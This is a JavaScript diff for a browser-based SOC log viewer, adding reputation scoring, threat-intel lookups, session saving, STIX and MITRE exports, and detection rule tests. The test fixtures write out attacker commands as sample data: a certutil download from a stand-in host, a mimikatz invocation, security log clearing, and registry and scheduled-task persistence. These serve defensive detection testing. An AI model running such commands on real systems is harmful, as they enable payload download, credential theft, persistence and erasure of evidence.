+let manualRepIndicators = [];
+function detectIndicatorType(raw){
+  const s = raw.trim();
+  if(/^https?:\/\//i.test(s)) return "url";
+  if(/^\d{1,3}(\.\d{1,3}){3}$/.test(s)) return "ip";
+  if(s.includes("/")) return "url";
+  return "domain";
+}
+function renderManualReputation(){
+  const wrap = document.getElementById("manualRepWrap");
+  if(!wrap) return;
+  if(!manualRepIndicators.length){ wrap.innerHTML = ""; return; }
+  const scored = manualRepIndicators.map(raw=>{
+    const type = detectIndicatorType(raw);
+    const s = type==="ip" ? scoreIP(raw) : type==="url" ? scoreURL(/^https?:\/\//i.test(raw)?raw:"http://"+raw) : scoreDomain(raw);
+    return {ind:raw, type, ...s};
+  }).sort((a,b)=>b.score-a.score);
+  wrap.innerHTML = `<div style="margin-top:16px;border-top:1px solid var(--border);padding-top:14px;">
+    <div class="kpi-row" style="grid-template-columns:repeat(4,1fr);margin-bottom:14px;">
+      <div class="kpi"><b>${scored.length}</b><span>Checked</span></div>
+      <div class="kpi crit"><b>${scored.filter(x=>x.verdict==="Malicious").length}</b><span>Malicious</span></div>
+      <div class="kpi high"><b>${scored.filter(x=>x.verdict==="Suspicious").length}</b><span>Suspicious</span></div>
+      <div class="kpi"><b>${scored.filter(x=>x.verdict==="Clean").length}</b><span>Clean</span></div>
+    </div>
+    ${scored.map(x=>repRowHTML(x,"manual")).join("")}
+  </div>`;
+}
+
+function renderReputation(){
+  const wrap = document.getElementById("repWrap");
+  if(!wrap) return;
+  if(!RAW_EVENTS.length){ wrap.innerHTML = `<div class="empty-state">Load logs to compute reputation scores.</div>`; document.getElementById("navRepCount").textContent="0"; return; }
+
+  const ips = [...new Set(RAW_EVENTS.flatMap(e=>[e.src_ip,e.dst_ip]).filter(Boolean))];
+  const domains = [...new Set(RAW_EVENTS.map(e=>e.domain).filter(Boolean))];
+  const urls = [...new Set(RAW_EVENTS.map(e=>e.url).filter(Boolean))];
+
+  const ipScores = ips.map(ip=>({ind:ip, type:"ip", ...scoreIP(ip)})).sort((a,b)=>b.score-a.score);
+  const domainScores = domains.map(d=>({ind:d, type:"domain", ...scoreDomain(d)})).sort((a,b)=>b.score-a.score);
+  const urlScores = urls.map(u=>({ind:u, type:"url", ...scoreURL(u)})).sort((a,b)=>b.score-a.score);
+  const all = [...ipScores, ...domainScores, ...urlScores];
+
+  document.getElementById("navRepCount").textContent = all.filter(x=>x.verdict==="Suspicious"||x.verdict==="Malicious").length;
+
+  const section = (title, items) => `<div class="ioc-section"><h4>${title} (${items.length})</h4>
+    ${items.map(repRowHTML).join("") || '<div class="empty-state" style="padding:16px 0;">None found.</div>'}</div>`;
+
+  wrap.innerHTML = `
+    <div class="kpi-row" style="grid-template-columns:repeat(4,1fr);margin-bottom:20px;">
+      <div class="kpi"><b>${all.length}</b><span>Indicators scored</span></div>
+      <div class="kpi crit"><b>${all.filter(x=>x.verdict==="Malicious").length}</b><span>Malicious</span></div>
+      <div class="kpi high"><b>${all.filter(x=>x.verdict==="Suspicious").length}</b><span>Suspicious</span></div>
+      <div class="kpi"><b>${all.filter(x=>x.verdict==="Clean").length}</b><span>Clean</span></div>
+    </div>
+    ${section("IP addresses", ipScores)}
+    ${section("Domains", domainScores)}
+    ${section("URLs", urlScores)}
+    <footer class="note">Scores are heuristic and computed entirely offline (watchlist matches, detection co-occurrence, correlation involvement, TLD reputation, subdomain entropy, known shortener/paste/dynDNS lists). They're a triage signal, not a verdict — use Live Lookup for third-party confirmation.</footer>
+  `;
+}
+function repRowHTML(x, idPrefix){
+  idPrefix = idPrefix || "auto";
+  const color = verdictColor(x.verdict);
+  const resultId = `live-${idPrefix}-${btoaSafe(x.ind)}`;
+  const normUrl = x.type==="url" && !/^https?:\/\//i.test(x.ind) ? "http://"+x.ind : x.ind;
+  const liveButtons = x.type==="ip" ? `<button class="btn ghost sm" onclick="liveLookup('vt_ip','${esc(x.ind)}','${resultId}')">VirusTotal</button><button class="btn ghost sm" onclick="liveLookup('abuseipdb','${esc(x.ind)}','${resultId}')">AbuseIPDB</button>`
+    : x.type==="domain" ? `<button class="btn ghost sm" onclick="liveLookup('vt_domain','${esc(x.ind)}','${resultId}')">VirusTotal</button><button class="btn ghost sm" onclick="liveLookup('urlhaus_host','${esc(x.ind)}','${resultId}')">URLhaus</button>`
+    : `<button class="btn ghost sm" onclick="liveLookup('vt_url','${esc(normUrl)}','${resultId}')">VirusTotal</button><button class="btn ghost sm" onclick="liveLookup('urlhaus_url','${esc(normUrl)}','${resultId}')">URLhaus</button>`;
+  return `<div class="rep-row">
+    <div class="top">
+      <span class="ind">${esc(x.type==="url"?defang(x.ind):x.ind)} <span class="geo-tag">${x.type}</span></span>
+      <span class="rep-verdict ${x.verdict}">${x.verdict} · ${x.score}</span>
+    </div>
+    <div class="rep-score-track"><div class="rep-score-fill" style="width:${x.score}%;background:${color}"></div></div>
+    <ul class="rep-reasons">${x.reasons.map(r=>`<li>${esc(r)}</li>`).join("")}</ul>
+    <div class="rep-live-row">${liveButtons}</div>
+    <div class="rep-live-result hidden" id="${resultId}"></div>
+  </div>`;
+}
+
+async function liveLookup(kind, indicator, resultElId){
+  const el = document.getElementById(resultElId);
+  if(!el) return;
+  el.classList.remove("hidden");
+  el.textContent = `Looking up ${indicator} via ${kind.replace(/_/g," ").toUpperCase()}…`;
+  try{
+    let text;
+    if(kind==="vt_ip" || kind==="vt_domain" || kind==="vt_url"){
+      if(!repApiKeys.vt){ el.textContent = "No VirusTotal API key set — add one in Live Lookup settings above."; return; }
+      let url;
+      if(kind==="vt_ip") url = `https://www.virustotal.com/api/v3/ip_addresses/${encodeURIComponent(indicator)}`;
+      else if(kind==="vt_domain") url = `https://www.virustotal.com/api/v3/domains/${encodeURIComponent(indicator)}`;
+      else { const id = btoa(indicator).replace(/=+$/,"").replace(/\+/g,"-").replace(/\//g,"_"); url = `https://www.virustotal.com/api/v3/urls/${id}`; }
+      const res = await fetch(url, {headers:{"x-apikey":repApiKeys.vt}});
+      if(!res.ok){ el.textContent = `VirusTotal returned HTTP ${res.status}. Check your API key/quota — some browsers/networks also block this call outright (CORS).`; return; }
+      const data = await res.json();
+      const stats = data && data.data && data.data.attributes && data.data.attributes.last_analysis_stats;
+      text = stats ? `VirusTotal: ${stats.malicious} malicious, ${stats.suspicious} suspicious, ${stats.harmless} harmless, ${stats.undetected} undetected (${Object.values(stats).reduce((a,b)=>a+b,0)} engines).` : "VirusTotal: no analysis stats in response.";
+    } else if(kind==="abuseipdb"){
+      if(!repApiKeys.abuseipdb){ el.textContent = "No AbuseIPDB API key set — add one in Live Lookup settings above."; return; }
+      const res = await fetch(`https://api.abuseipdb.com/api/v2/check?ipAddress=${encodeURIComponent(indicator)}&maxAgeInDays=90`, {headers:{"Key":repApiKeys.abuseipdb,"Accept":"application/json"}});
+      if(!res.ok){ el.textContent = `AbuseIPDB returned HTTP ${res.status}. Check your API key/quota — some browsers/networks also block this call outright (CORS).`; return; }
+      const data = await res.json();
+      const d = data && data.data;
+      text = d ? `AbuseIPDB: confidence score ${d.abuseConfidenceScore}/100, ${d.totalReports} report(s), country ${d.countryCode||"?"}, ISP: ${d.isp||"?"}.` : "AbuseIPDB: no data in response.";
+    } else if(kind==="urlhaus_host"){
+      const res = await fetch("https://urlhaus-api.abuse.ch/v1/host/", {method:"POST", headers:{"Content-Type":"application/x-www-form-urlencoded"}, body:"host="+encodeURIComponent(indicator)});
+      const data = await res.json();
+      text = data.query_status==="ok" ? `URLhaus: ${data.url_count} known malicious URL(s) hosted here. Blacklists: ${JSON.stringify(data.blacklists||{})}.` : `URLhaus: ${data.query_status} (no match found).`;
+    } else if(kind==="urlhaus_url"){
+      const res = await fetch("https://urlhaus-api.abuse.ch/v1/url/", {method:"POST", headers:{"Content-Type":"application/x-www-form-urlencoded"}, body:"url="+encodeURIComponent(indicator)});
+      const data = await res.json();
+      text = data.query_status==="ok" ? `URLhaus: threat=${data.threat}, status=${data.url_status}, tags=${(data.tags||[]).join(", ")||"none"}.` : `URLhaus: ${data.query_status} (no match found).`;
+    }
+    el.textContent = text;
+  }catch(e){
+    el.textContent = "Lookup failed: "+e.message+". Usually a CORS restriction (the provider doesn't allow direct browser calls) or a network/offline issue — the provider's own website will still work.";
+  }
+}
+window.liveLookup = liveLookup;
+function applyRepKeys(){
+  repApiKeys.vt = (document.getElementById("vtKeyInput").value||"").trim();
+  repApiKeys.abuseipdb = (document.getElementById("abuseKeyInput").value||"").trim();
+  if(document.getElementById("rememberKeysChk").checked){
+    try{ localStorage.setItem("soc_rep_keys", JSON.stringify(repApiKeys)); }catch(e){}
+  } else {
+    try{ localStorage.removeItem("soc_rep_keys"); }catch(e){}
+  }
+  document.getElementById("repKeyStatus").textContent = "Keys applied for this session" + (document.getElementById("rememberKeysChk").checked ? " and remembered in this browser." : ".");
+}
+
+/* ================= SESSIONS ================= */
+function getSessions(){ try{ return JSON.parse(localStorage.getItem("soc_sessions")||"{}"); }catch(e){ return {}; } }
+function saveSession(name){
+  const sessions = getSessions();
+  sessions[name] = {
+    events: RAW_EVENTS,
+    disabledRules: [...disabledRules],
+    ackedRuleIds: [...ackedRuleIds],
+    wlIps, wlDomains, ipIntel,
+    customRulesSigma: RULES.filter(r=>r.custom).map(r=>r.sigmaSrc),
+    notes: document.getElementById("notesArea") ? document.getElementById("notesArea").value : "",
+    savedAt: new Date().toISOString(),
+  };
+  try{ localStorage.setItem("soc_sessions", JSON.stringify(sessions)); }catch(e){ alert("Could not save session (storage may be full or unavailable)."); }
+}
+function loadSession(name){
+  const sessions = getSessions();
+  const s = sessions[name];
+  if(!s) return;
+  for(let i=RULES.length-1;i>=0;i--) if(RULES[i].custom) RULES.splice(i,1);
+  (s.customRulesSigma||[]).forEach(src=>{ if(!src) return; const res = compileSigma(src); if(res.rule) RULES.push(res.rule); });
+  disabledRules = new Set(s.disabledRules||[]);
+  ackedRuleIds = new Set(s.ackedRuleIds||[]);
+  wlIps = s.wlIps||[]; wlDomains = s.wlDomains||[]; ipIntel = s.ipIntel||{};
+  RAW_EVENTS = s.events||[];
+  DET_HITS = runDetections(RAW_EVENTS);
+  CORR_HITS = runCorrelations();
+  if(document.getElementById("wlInput")) document.getElementById("wlInput").value = wlIps.concat(wlDomains).join("\n");
+  if(document.getElementById("intelInput")) document.getElementById("intelInput").value = Object.entries(ipIntel).map(([ip,d])=>`${ip},${d.country},${d.asn}`).join("\n");
+  if(document.getElementById("notesArea")) document.getElementById("notesArea").value = s.notes||"";
+  render();
+  document.querySelector('[data-view="dashboard"]').click();
+}
+function deleteSession(name){
+  const sessions = getSessions();
+  delete sessions[name];
+  try{ localStorage.setItem("soc_sessions", JSON.stringify(sessions)); }catch(e){}
+  renderSessionDropdown();
+}
+function renderSessionDropdown(){
+  const dd = document.getElementById("sessionDropdown");
+  if(!dd) return;
+  const sessions = getSessions();
+  const names = Object.keys(sessions);
+  dd.innerHTML = `
+    <div class="si" onclick="promptSaveSession()">💾 Save current as…</div>
+    <hr>
+    <div class="lbl">Saved sessions (${names.length})</div>
+    ${names.length? names.map(n=>`<div class="si"><span onclick="loadSessionAndClose('${esc(n)}')" style="flex:1;">${esc(n)}</span><span onclick="deleteSession('${esc(n)}')" style="color:var(--crit);font-size:10px;">✕</span></div>`).join("") : '<div class="si" style="color:var(--text-faint);cursor:default;">None saved yet</div>'}
+  `;
+}
+window.promptSaveSession = function(){
+  const name = prompt("Session name:", "case-"+new Date().toISOString().slice(0,10));
+  if(!name) return;
+  saveSession(name);
+  renderSessionDropdown();
+};
+window.loadSessionAndClose = function(name){ loadSession(name); document.getElementById("sessionDropdown").classList.add("hidden"); };
+window.deleteSession = deleteSession;
+
+/* ================= FILTER PRESETS ================= */
+function savePresetPrompt(){
+  const name = prompt("Preset name:");
+  if(!name) return;
+  filterPresets = filterPresets.filter(p=>p.name!==name);
+  filterPresets.push({name, text: tableFilterText, sev: tableFilterSev});
+  try{ localStorage.setItem("soc_filter_presets", JSON.stringify(filterPresets)); }catch(e){}
+  renderPresetSelect();
+}
+function renderPresetSelect(){
+  const sel = document.getElementById("presetSelect");
+  if(!sel) return;
+  sel.innerHTML = `<option value="">Saved filters…</option>` + filterPresets.map(p=>`<option value="${esc(p.name)}">${esc(p.name)}</option>`).join("");
+}
+function applyPreset(name){
+  const p = filterPresets.find(x=>x.name===name);
+  if(!p) return;
+  tableFilterText = p.text; tableFilterSev = p.sev;
+  document.getElementById("tableSearch").value = tableFilterText;
+  document.getElementById("sevFilter").value = tableFilterSev;
+  renderTable();
+}
+
+/* ================= MITRE NAVIGATOR / STIX EXPORT ================= */
+function cryptoRandom(){ return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, c=>{ const r=Math.random()*16|0; const v=c==="x"?r:(r&0x3|0x8); return v.toString(16); }); }
+function downloadJSON(obj, filename){
+  const blob = new Blob([JSON.stringify(obj,null,2)], {type:"application/json"});
+  const a = document.createElement("a");
+  a.href = URL.createObjectURL(blob); a.download = filename; a.click();
+}
+function exportMitreNavigator(){
+  const techScores = {};
+  RULES.forEach(r=>{
+    const hits = DET_HITS.filter(h=>h.rule.id===r.id).length;
+    (r.technique||"").split("/").map(t=>t.trim()).filter(t=>/^T\d/.test(t)).forEach(t=>{ techScores[t] = (techScores[t]||0) + hits; });
+  });
+  const layer = {
+    name: "SOC Log Viewer Coverage", versions:{attack:"14",navigator:"4.9.1",layer:"4.5"}, domain:"enterprise-attack",
+    description: "Auto-generated from loaded logs by SOC Log Viewer — score is detection hit count per technique.",
+    techniques: Object.entries(techScores).map(([id,score])=>({techniqueID:id, score, color:"", comment:"", enabled:true})),
+    gradient: {colors:["#3DBE7A","#F2C94C","#E5484D"], minValue:0, maxValue: Math.max(1,...Object.values(techScores))},
+    legendItems: [], showTacticRowBackground:false, tacticRowBackground:"#dddddd", selectTechniquesAcrossTactics:true,
+  };
+  downloadJSON(layer, "mitre_navigator_layer.json");
+}
+function exportStixBundle(){
+  const objs = [];
+  const now = new Date().toISOString();
+  [...new Set(RAW_EVENTS.flatMap(e=>[e.src_ip,e.dst_ip]).filter(Boolean))].forEach(ip=>{
+    objs.push({type:"indicator", spec_version:"2.1", id:"indicator--"+cryptoRandom(), created:now, modified:now, pattern:`[ipv4-addr:value = '${ip}']`, pattern_type:"stix", valid_from:now, name:`IP ${ip}`});
+  });
+  [...new Set(RAW_EVENTS.map(e=>e.domain).filter(Boolean))].forEach(d=>{
+    objs.push({type:"indicator", spec_version:"2.1", id:"indicator--"+cryptoRandom(), created:now, modified:now, pattern:`[domain-name:value = '${d}']`, pattern_type:"stix", valid_from:now, name:`Domain ${d}`});
+  });
+  [...new Set(RAW_EVENTS.map(e=>e.hash).filter(Boolean))].forEach(h=>{
+    const algo = h.length===64?"SHA-256":h.length===40?"SHA-1":"MD5";
+    objs.push({type:"indicator", spec_version:"2.1", id:"indicator--"+cryptoRandom(), created:now, modified:now, pattern:`[file:hashes.'${algo}' = '${h}']`, pattern_type:"stix", valid_from:now, name:`Hash ${h.slice(0,12)}…`});
+  });
+  downloadJSON({type:"bundle", id:"bundle--"+cryptoRandom(), objects:objs}, "ioc_stix_bundle.json");
+}
+window.exportMitreNavigator = exportMitreNavigator;
+window.exportStixBundle = exportStixBundle;
+
+/* ================= RULE TESTS (fixtures) ================= */
+const RULE_FIXTURES = [
+  {name:"Encoded PowerShell → enc_powershell", event:{process:"powershell.exe", cmd:"powershell -enc JABjAG0"}, expect:["enc_powershell"]},
+  {name:"Plain PowerShell → no match", event:{process:"powershell.exe", cmd:"powershell -Command Get-Process"}, expect:[]},
+  {name:"Mimikatz → lsass_dump", event:{cmd:"mimikatz privilege::debug"}, expect:["lsass_dump"]},
+  {name:"PsExec admin share → psexec", event:{process:"psexec.exe", cmd:"psexec \\\\HOST -s cmd"}, expect:["psexec"]},
+  {name:"Registry Run key → reg_run_persist", event:{cmd:"reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d y"}, expect:["reg_run_persist"]},
+  {name:"Benign reg query → no match", event:{cmd:"reg query HKLM\\Software\\Microsoft"}, expect:[]},
+  {name:"schtasks /create → sched_task_persist", event:{cmd:"schtasks /create /tn x /tr y.exe"}, expect:["sched_task_persist"]},
+  {name:"certutil urlcache → lolbin_download", event:{cmd:"certutil -urlcache -f http://x/y z.exe"}, expect:["lolbin_download"]},
+  {name:"whoami /all → discovery_cmds", event:{cmd:"whoami /all"}, expect:["discovery_cmds"]},
+  {name:"cmd.exe child of services.exe → susp_child", event:{parent:"services.exe", process:"cmd.exe"}, expect:["susp_child"]},
+  {name:"notepad.exe child of explorer.exe → no match", event:{parent:"explorer.exe", process:"notepad.exe"}, expect:[]},
+  {name:"wmic process call create → wmi_winrm", event:{cmd:"wmic /node:x process call create cmd.exe"}, expect:["wmi_winrm"]},
+  {name:"dst_port 4444 → susp_port", event:{dst_port:4444}, expect:["susp_port"]},
+  {name:"dst_port 443 → no match", event:{dst_port:443}, expect:[]},
+  {name:"domain .xyz → susp_tld_dns", event:{domain:"malware.xyz"}, expect:["susp_tld_dns"]},
+  {name:"password= in cmd → cleartext_pw", event:{cmd:"net use x: /user:bob password=Summer2026!"}, expect:["cleartext_pw"]},
+  {name:"wevtutil cl → clear_logs", event:{cmd:"wevtutil cl Security"}, expect:["clear_logs"]},
+  {name:"pastebin.com domain → exfil_paste", event:{domain:"pastebin.com"}, expect:["exfil_paste"]},
+];
+function renderRuleTests(){
+  let pass=0, fail=0;
+  const builtins = RULES.filter(r=>!r.custom);
+  const rows = RULE_FIXTURES.map(f=>{
+    const actual = builtins.filter(r=>{ try{ return r.test(f.event); }catch(e){ return false; } }).map(r=>r.id);
+    const ok = JSON.stringify(actual.slice().sort()) === JSON.stringify(f.expect.slice().sort());
+    if(ok) pass++; else fail++;
+    return `<div class="test-row">
+      <span>${esc(f.name)}</span>
+      <span style="font-family:var(--mono);color:var(--text-faint);">${f.expect.join(", ")||"(none)"}</span>
+      <span class="${ok?'test-pass':'test-fail'}">${ok? "PASS" : "FAIL"}</span>
+    </div>`;
+  }).join("");
+  document.getElementById("testRows").innerHTML = rows;
+  document.getElementById("testKpiRow").innerHTML = `
+    <div class="kpi"><b>${RULE_FIXTURES.length}</b><span>Fixtures</span></div>
+    <div class="kpi" style="border-color:rgba(61,190,122,.4);"><b style="color:var(--low);">${pass}</b><span>Passing</span></div>
+    <div class="kpi crit"><b>${fail}</b><span>Failing</span></div>`;
+}
+
+/* ================= MASTER RENDER ================= */
+function render(){
+  CORR_HITS = runCorrelations();
+  const subParts = [];
+  if(RAW_EVENTS.length) subParts.push(`${RAW_EVENTS.length} events · ${DET_HITS.length} detections · ${CORR_HITS.length} correlations`);
+  if(FIM_EVENTS.length) subParts.push(`${FIM_EVENTS.length} FIM events · ${FIM_HITS.length} FIM findings`);
+  document.getElementById("topSub").textContent = subParts.length ? "Loaded " + subParts.join(" · ") : "No logs loaded";
+  document.getElementById("navDetCount").textContent = DET_HITS.length;
+  renderDashboard(); renderTable(); renderDetections(); renderRules();
+  renderTimeline(); renderIOCs(); renderUsers(); renderNetwork(); renderTreeGraph();
+  renderUrls(); renderProcess(); renderProcessTree(); renderHunt(); renderMitre();
+  renderTools(); buildQueryBuilders(); renderReport();
+  renderCorrelations(); renderCustomRules(); renderRuleTests(); renderPresetSelect(); renderReputation(); renderManualReputation();
+  renderFim();
+  document.getElementById("navUebaCount").textContent = new Set(RAW_EVENTS.map(e=>e.user).filter(Boolean)).size;
+  document.getElementById("navStoryCount").textContent = new Set(DET_HITS.map(h=>h.event.user).filter(Boolean)).size;
+}
+
+/* ================= DASHBOARD ================= */
+function renderDashboard(){
+  const sevCounts = {CRITICAL:0,HIGH:0,MEDIUM:0,LOW:0};
+  RAW_EVENTS.forEach(e=> sevCounts[e.severity] !== undefined ? sevCounts[e.severity]++ : sevCounts.LOW++ );
+  const hostSet = new Set(RAW_EVENTS.map(e=>e.host).filter(Boolean));
+  const userSet = new Set(RAW_EVENTS.map(e=>e.user).filter(Boolean));
+
+  document.getElementById("kpiRow").innerHTML = `
+    <div class="kpi"><b>${RAW_EVENTS.length}</b><span>Events</span></div>
+    <div class="kpi crit"><b>${DET_HITS.length}</b><span>Detections</span></div>
+    <div class="kpi crit"><b>${sevCounts.CRITICAL}</b><span>Critical</span></div>
+    <div class="kpi high"><b>${sevCounts.HIGH}</b><span>High</span></div>
+    <div class="kpi"><b>${hostSet.size}</b><span>Hosts</span></div>
+    <div class="kpi"><b>${userSet.size}</b><span>Users</span></div>
+  `;
+
+  const tacticCounts = {};
+  DET_HITS.forEach(h=> tacticCounts[h.rule.tactic] = (tacticCounts[h.rule.tactic]||0)+1 );
+  const maxT = Math.max(1, ...Object.values(tacticCounts));
+  document.getElementById("tacticBars").innerHTML = Object.entries(tacticCounts).sort((a,b)=>b[1]-a[1]).map(([t,c])=>`
+    <div class="bar-row"><span class="label">${esc(t)}</span><div class="bar-track"><div class="bar-fill" style="width:${c/maxT*100}%"></div></div><span class="count">${c}</span></div>
+  `).join("") || `<div class="empty-state" style="padding:20px 0;">No detections yet</div>`;
+
+  const totalSev = Object.values(sevCounts).reduce((a,b)=>a+b,0) || 1;
+  document.getElementById("sevBars").innerHTML = ["CRITICAL","HIGH","MEDIUM","LOW"].map(s=>`
+    <div class="bar-row"><span class="label">${s}</span><div class="bar-track"><div class="bar-fill" style="width:${sevCounts[s]/totalSev*100}%;background:${sevColor[s]}"></div></div><span class="count">${sevCounts[s]}</span></div>
+  `).join("");
+
+  const byRule = {};
+  DET_HITS.forEach(h=>{ (byRule[h.rule.id] = byRule[h.rule.id]||{rule:h.rule,items:[]}).items.push(h.event); });
+  const top = Object.values(byRule).sort((a,b)=>b.items.length-a.items.length).slice(0,6);
+  document.getElementById("topDetections").innerHTML = top.map(d=>detCardHTML(d)).join("") || `<div class="empty-state">No rules fired against the loaded logs.</div>`;
+}
+
+function detCardHTML(d){
+  const ex = d.items[0];
+  return `<div class="det-card ${d.rule.severity}" onclick="goToRule('${d.rule.id}')">
+    <div class="top"><h5>${esc(d.rule.title)}</h5><span class="sev-tag sev-${d.rule.severity}">${d.rule.severity}</span></div>
+    <div class="meta">ATT&amp;CK ${esc(d.rule.technique)} · ${esc(d.rule.tactic)}</div>
+    <div class="ex">${esc(ex.cmd || ex.domain || ex.dst_ip || "—")}</div>
+    <div class="count">${d.items.length} matching event${d.items.length===1?"":"s"}</div>
+  </div>`;
+}
+window.goToRule = function(ruleId){
+  document.querySelector('[data-view="detections"]').click();
+  setTimeout(()=>{ const el=document.getElementById("card-"+ruleId); if(el) el.scrollIntoView({behavior:"smooth",block:"center"}); },50);
+};
+
+/* ================= LOG TABLE ================= */
+let tableFilterText="", tableFilterSev="", tableSortKey="time", tableSortDir=1;
+function renderTable(){
+  let rows = RAW_EVENTS.filter(e=>{
+    if(tableFilterSev && e.severity!==tableFilterSev) return false;
+    if(tableFilterText){
+      const hay = Object.values(e).join(" ").toLowerCase();
+      if(!hay.includes(tableFilterText.toLowerCase())) return false;
+    }
+    return true;
+  });
+  rows = rows.slice().sort((a,b)=>{
+    const av=a[tableSortKey]||"", bv=b[tableSortKey]||"";
+    if(tableSortKey==="time") return (new Date(av)-new Date(bv))*tableSortDir;
+    return String(av).localeCompare(String(bv))*tableSortDir;
+  }).slice(0,1000);
+
+  document.getElementById("tableBody").innerHTML = rows.map(e=>{
+    const hit = DET_HITS.find(h=>h.event===e);
+    return `<tr>
+      <td>${fmtTime(e.time)}</td>
+      <td><span class="sev-tag sev-${e.severity in sevColor? e.severity:'LOW'}">${esc(e.severity||"LOW")}</span></td>
+      <td>${esc(e.host)}</td><td>${esc(e.user)}</td><td>${esc(e.process)}</td><td>${esc(e.parent)}</td>
+      <td title="${esc(e.cmd)}">${esc(e.cmd)}</td>
+      <td>${esc(e.src_ip)}</td><td>${esc(e.dst_ip)}</td><td>${esc(e.dst_port)}</td><td>${esc(e.proto)}</td><td>${esc(e.domain)}</td>
+      <td>${hit? esc(hit.rule.technique) : "—"}</td>
+    </tr>`;
+  }).join("") || `<tr><td colspan="13" style="text-align:center;color:var(--text-faint);padding:30px;">No matching events</td></tr>`;
+}
+function setTableFilter(text){
+  tableFilterText = text || "";
+  document.getElementById("tableSearch").value = tableFilterText;
+  renderTable();
+  document.querySelector('[data-view="table"]').click();
+}
+window.setTableFilter = setTableFilter;
+
+/* ================= DETECTIONS ================= */
+let expandedRule = null;
+function detectionCardList(){
+  const byRule = {};
+  DET_HITS.forEach(h=>{ (byRule[h.rule.id] = byRule[h.rule.id]||{rule:h.rule,items:[]}).items.push(h.event); });
+  let cards = Object.values(byRule).sort((a,b)=>b.items.length-a.items.length);
+  if(!showAcked) cards = cards.filter(d=>!ackedRuleIds.has(d.rule.id));
+  return cards;
+}
+function renderDetections(){
+  const cards = detectionCardList();
+  if(focusedDetIndex >= cards.length) focusedDetIndex = cards.length-1;
+  document.getElementById("detGrid").innerHTML = cards.map((d,i)=>{
+    const ex = d.items[0];
+    const hosts = [...new Set(d.items.map(e=>e.host).filter(Boolean))];
+    const users = [...new Set(d.items.map(e=>e.user).filter(Boolean))];
+    const acked = ackedRuleIds.has(d.rule.id);
+    let html = `<div id="card-${d.rule.id}" class="det-card ${d.rule.severity} ${acked?'acked':''} ${i===focusedDetIndex?'focused':''}" onclick="toggleRuleDetail('${d.rule.id}')">
+      <button class="ack-btn" onclick="event.stopPropagation();toggleAck('${d.rule.id}')">${acked?"Unack":"Ack"}</button>
+      <div class="top"><h5>${esc(d.rule.title)}</h5><span class="sev-tag sev-${d.rule.severity}">${d.rule.severity}</span></div>
+      <div class="meta">ATT&amp;CK ${esc(d.rule.technique)} · ${esc(d.rule.tactic)}${d.rule.custom?' · custom':''}</div>
+      <div class="ex">${esc(ex.cmd || ex.domain || ex.dst_ip || "—")}</div>
+      <div class="count">${d.items.length} matching event${d.items.length===1?"":"s"} · ${hosts.length} hosts · ${users.length} users</div>
+    </div>`;
+    if(expandedRule === d.rule.id){
+      html += `<div class="det-detail">
+        <h5>Representative raw event</h5>
+        <table class="kv-table">
+          <tr><td>Time</td><td>${fmtTime(ex.time)}</td></tr>
+          <tr><td>Host</td><td>${esc(ex.host)}</td></tr>
+          <tr><td>User</td><td>${esc(ex.user)}</td></tr>
+          <tr><td>Parent</td><td>${esc(ex.parent)}</td></tr>
+          <tr><td>Process</td><td>${esc(ex.process)}</td></tr>
+          <tr><td>CommandLine</td><td>${esc(ex.cmd)}</td></tr>
+          <tr><td>Src IP</td><td>${esc(ex.src_ip)}</td></tr>
+          <tr><td>Dst IP</td><td>${esc(ex.dst_ip)}</td></tr>
+          <tr><td>Domain</td><td>${esc(ex.domain)}</td></tr>
+          <tr><td>Hash</td><td>${esc(ex.hash)}</td></tr>
+        </table>
+        <div style="margin-top:10px;font-size:11px;color:var(--text-faint);">Hosts: ${hosts.map(esc).join(", ")||"—"}<br>Users: ${users.map(esc).join(", ")||"—"}</div>
+        <div style="margin-top:10px;font-size:11.5px;color:var(--text-dim);"><b style="color:var(--text-faint);">Suggested response:</b> ${esc(d.rule.playbook||"")}</div>
+        <div class="raw-json">${esc(JSON.stringify(ex,null,2))}</div>
+      </div>`;
+    }
+    return html;
+  }).join("") || `<div class="empty-state">${DET_HITS.length? "All findings acknowledged — check \"show acknowledged\" to see them." : "No detection rules fired. Load logs to begin analysis."}</div>`;
+}
+window.toggleRuleDetail = function(id){ expandedRule = expandedRule===id ? null : id; renderDetections(); };
+window.toggleAck = function(id){ if(ackedRuleIds.has(id)) ackedRuleIds.delete(id); else ackedRuleIds.add(id); renderDetections(); };
+document.addEventListener("keydown", (e)=>{
+  const view = document.getElementById("view-detections");
+  if(!view || view.classList.contains("hidden")) return;
+  if(document.activeElement && ["INPUT","TEXTAREA","SELECT"].includes(document.activeElement.tagName)) return;
+  const cards = detectionCardList();
+  if(!cards.length) return;
+  if(e.key==="j"){ focusedDetIndex = Math.min(cards.length-1, focusedDetIndex+1); renderDetections(); }
+  else if(e.key==="k"){ focusedDetIndex = Math.max(0, focusedDetIndex-1); renderDetections(); }
+  else if(e.key==="a" && focusedDetIndex>=0 && cards[focusedDetIndex]){ toggleAck(cards[focusedDetIndex].rule.id); }
+});
+
+/* ================= ALERT RULES ================= */
+function renderRules(){
+  document.getElementById("rulesWrap").innerHTML = RULES.map(r=>{
+    const on = !disabledRules.has(r.id);
+    return `<div class="rule-row">
+      <div><div class="rt">${esc(r.title)}</div><div class="rd">${esc(r.desc.slice(0,90))}${r.desc.length>90?"…":""}</div></div>
+      <span>${esc(r.tactic)}</span>
+      <span style="font-family:var(--mono);color:var(--text-faint);">${esc(r.technique)}</span>
+      <span class="sev-tag sev-${r.severity}">${r.severity}</span>
+      <div class="toggle ${on?'on':''}" onclick="toggleRule('${r.id}')"></div>
+    </div>`;
+  }).join("");
+}
+window.toggleRule = function(id){
+  if(disabledRules.has(id)) disabledRules.delete(id); else disabledRules.add(id);
+  DET_HITS = runDetections(RAW_EVENTS);
+  render();
+};
+
+/* ================= ATTACK STORY (timeline) ================= */
+function renderTimeline(){
+  const byUser = {};
+  DET_HITS.forEach(h=>{ const u=h.event.user||"(unknown user)"; (byUser[u]=byUser[u]||[]).push(h); });
+  const users = Object.entries(byUser).sort((a,b)=>b[1].length-a[1].length);
+  const totalEvents = DET_HITS.length;
+  document.getElementById("storyKpiRow").innerHTML = `
+    <div class="kpi crit"><b>${users.length}</b><span>Attack chains</span></div>
+    <div class="kpi"><b>${users.length}</b><span>Entities involved</span></div>
+    <div class="kpi high"><b>${totalEvents}</b><span>Flagged events</span></div>`;
+  document.getElementById("timelineWrap").innerHTML = users.map(([user,hits])=>{
